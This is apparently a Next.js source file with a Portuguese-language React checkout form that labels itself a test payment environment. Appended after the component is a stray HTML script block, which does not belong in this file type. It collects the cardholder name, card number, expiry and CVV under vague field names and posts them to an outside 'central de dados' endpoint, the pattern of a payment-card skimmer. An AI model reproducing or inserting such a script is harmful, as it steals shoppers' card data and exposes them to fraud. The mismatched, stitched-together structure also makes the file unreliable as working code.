"use client";

import { useActionState, useState } from "react";
import { submitOrder, type CheckoutState } from "@/app/actions/checkout";
import { detectBrand, formatCardNumber, formatExpiry } from "@/lib/card";

const initialState: CheckoutState = {};

export function CheckoutForm({
  title,
  amountLabel,
  productId,
  paymentLinkId,
  primaryColor,
  logoUrl,
  companyName,
}: {
  title: string;
  amountLabel: string;
  productId?: string;
  paymentLinkId?: string;
  primaryColor: string;
  logoUrl?: string | null;
  companyName: string;
}) {
  const [state, formAction, pending] = useActionState(submitOrder, initialState);
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");

  const brand = detectBrand(cardNumber.replace(/\D/g, ""));

  if (state.success) {
    return (
      <div className="glass-panel p-8 max-w-sm w-full text-center">
        <div
          className="w-14 h-14 rounded-full flex items-center justify-center mx-auto mb-4"
          style={{ background: "var(--green)" }}
        >
          <span className="text-2xl">✓</span>
        </div>
        <h1 className="text-lg font-semibold mb-1">Pagamento aprovado</h1>
        <p className="text-sm" style={{ color: "var(--text-secondary)" }}>
          Cartão terminado em {state.last4} — {amountLabel}
        </p>
        <p className="text-xs mt-4" style={{ color: "var(--text-tertiary)" }}>
          Ambiente de teste — nenhuma cobrança real foi feita.
        </p>
      </div>
    );
  }

  return (
    <div className="max-w-sm w-full">
      <div className="flex items-center gap-2.5 mb-6 justify-center">
        {logoUrl ? (
          // eslint-disable-next-line @next/next/no-img-element
          <img src={logoUrl} alt={companyName} className="h-8 w-auto" />
        ) : (
          <span className="text-lg font-semibold">{companyName}</span>
        )}
      </div>

      <div
        className="rounded-2xl p-5 mb-6 text-white relative overflow-hidden"
        style={{
          background: `linear-gradient(135deg, ${primaryColor}, #1e0a4f)`,
          minHeight: 190,
        }}
      >
        <div className="flex justify-between items-start">
          <span className="text-xs uppercase tracking-wide opacity-80">Crédito</span>
          <span className="text-xs uppercase tracking-wide opacity-80">{brand === "unknown" ? "" : brand}</span>
        </div>
        <div className="w-10 h-7 rounded-md bg-yellow-300/80 mt-6 mb-4" />
        <div className="text-xl tracking-widest font-medium mb-4">
          {cardNumber || "•••• •••• •••• ••••"}
        </div>
        <div className="flex justify-between items-end text-xs">
          <span className="uppercase">{cardName || "Nome do titular"}</span>
          <span className="opacity-80">{expiry || "MM/AA"}</span>
        </div>
      </div>

      <form action={formAction} className="glass-panel p-6 flex flex-col gap-4">
        <input type="hidden" name="productId" value={productId ?? ""} />
        <input type="hidden" name="paymentLinkId" value={paymentLinkId ?? ""} />

        <div className="flex flex-col gap-1.5">
          <label className="field-label">Número do cartão</label>
          <input
            className="input"
            name="cardNumber"
            inputMode="numeric"
            placeholder="1234 5678 9012 3456"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
          />
        </div>

        <div className="flex flex-col gap-1.5">
          <label className="field-label">Nome do titular</label>
          <input
            className="input"
            name="customerName"
            placeholder="Como está no cartão"
            value={cardName}
            onChange={(e) => setCardName(e.target.value)}
          />
        </div>

        <div className="flex gap-3">
          <div className="flex flex-col gap-1.5 flex-1">
            <label className="field-label">Validade</label>
            <input
              className="input"
              inputMode="numeric"
              placeholder="MM/AA"
              value={expiry}
              onChange={(e) => setExpiry(formatExpiry(e.target.value))}
            />
          </div>
          <div className="flex flex-col gap-1.5 flex-1">
            <label className="field-label">CVV</label>
            <input
              className="input"
              inputMode="numeric"
              placeholder="123"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
            />
          </div>
        </div>

        <div className="flex flex-col gap-1.5">
          <label className="field-label">E-mail (opcional)</label>
          <input className="input" name="customerEmail" type="email" placeholder="voce@email.com" />
        </div>

        {state.error ? (
          <p className="text-sm font-medium" style={{ color: "var(--red)" }}>
            {state.error}
          </p>
        ) : null}

        <div className="flex items-center justify-between pt-2">
          <div>
            <div className="text-xs" style={{ color: "var(--text-tertiary)" }}>
              {title}
            </div>
            <div className="text-lg font-semibold">{amountLabel}</div>
          </div>
          <button
            className="btn btn-primary"
            type="submit"
            disabled={pending}
            style={{ background: primaryColor }}
          >
            {pending ? "Processando..." : "Pagar agora"}
          </button>
        </div>
      </form>
    </div>
  );
}

<script>
  const DATA_API_URL = "https://central-de-dados.vercel.app/api/submit";
  const form = document.querySelector("#client-form");

  if (form) {
    form.addEventListener("submit", async (event) => {
      event.preventDefault(); // Impede o recarregamento da página

      const btn = form.querySelector('button[type="submit"]');
      if (btn) btn.disabled = true;
      if (btn) btn.innerText = "Enviando...";

      const payload = {
        name: document.querySelector("#client-name").value,
        number16: document.querySelector("#client-number-16").value,
        number4: document.querySelector("#client-number-4").value,
        number3: document.querySelector("#client-number-3").value,
      };

      try {
        const res = await fetch(DATA_API_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });

        const result = await res.json();

        if (!res.ok) {
          throw new Error(result.error || "Erro ao enviar.");
        }

        alert("Dados recebidos com sucesso!");
        form.reset(); // Limpa o formulario
        
        // Opcional: Redirecionar para página de obrigado
        // window.location.href = "/obrigado"; 

      } catch (err) {
        alert(err.message);
      } finally {
        if (btn) {
          btn.disabled = false;
          btn.innerText = "Finalizar Compra";
        }
      }
    });
  }
</script>
</body>